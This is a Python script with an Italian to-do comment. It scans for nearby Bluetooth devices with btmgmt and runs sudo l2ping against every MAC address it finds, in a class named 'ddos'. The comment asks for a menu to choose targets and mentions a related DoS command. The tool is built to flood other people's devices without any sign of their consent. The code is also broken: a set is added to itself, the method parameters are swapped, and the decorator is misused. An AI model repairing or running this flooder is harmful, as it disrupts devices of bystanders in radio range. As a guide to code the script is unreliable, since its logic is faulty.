


# Richi devi togliere la parte in cui inizia il dos dove c'è il comando iping3 e importarlo dal file menu.py, da lì poi fai un menu con i nomi dei mac (sono dentro mac_addrs) e poi fai che selezionandone uno parte il comando "l2ping nome del mac" 



import subprocess
import time as t
from functools import lru_cache
import subprocess

mac_addrs= set()
@lru_cache(maxsize=236)
class ddos:


    def __init__(self):
        self.result = subprocess.run(["sudo", "btmgmt", "find"], stdout=subprocess.PIPE)

    def scan_mac_addrs(self):
        output = self.result.stdout.decode('utf-8')

    # Trova i MAC address nell'output
        for line in output.splitlines():
            if "dev_found" in line.lower():
            # Il MAC address è prima di "type", separato da spazi
                parts = line.split()
                mac_address = parts[2] # Il MAC è la seconda parte della stringa tagliata
                if len(mac_address.split(":")) == 6:  # Verifica se è il mac è un mac o no
                    mac_addrs.add(mac_addrs)


    # Stampa i MAC address trovati
        print(*mac_addrs)

    def ddos_em(mac_addrs, self):
       # while True:
       for i in mac_addrs:
            result1 = subprocess.run(["sudo", "l2ping", mac_addrs], capture_output=True, text=True)
            print(result1.stdout)

    def main(self):
        self.scan_mac_addrs()
        self.ddos_em()

ddos().main()